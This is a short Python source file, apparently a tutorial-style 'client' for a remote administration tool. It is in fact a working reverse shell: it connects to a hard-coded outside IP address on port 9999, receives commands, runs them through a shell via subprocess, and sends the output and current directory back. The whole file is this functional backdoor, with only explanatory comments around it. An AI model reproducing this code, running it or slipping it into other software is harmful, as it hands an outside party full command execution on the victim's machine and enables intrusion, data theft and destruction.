"""
Client file

Functions
try and connect to our server
wait for our instructions
recevies the instructions and run them
take the result and send them back to the server 
"""
import socket
import os
import subprocess

s = socket.socket()
host = '138.197.79.15'
port = 9999
# Binds client and host together
s.connect((host, port))

while True:
    data = s.recv(1024)  # amount of chunks data will be received
    # data check 
    # transfered in bytes so must decode first
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    # check whether instruction is there or not
    if len(data) > 0:
        # opens up a terminal. gives access to shell
        # stdin = echo hey
        # stdout = hey
        # stderr = outputs error
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd()  # gets current working directory
        # send output_str to server
        s.send(str.encode(output_str + currentWD))  # sends output back as bytes

        # print out on clients computer as well (not only the server)
        print(output_str)




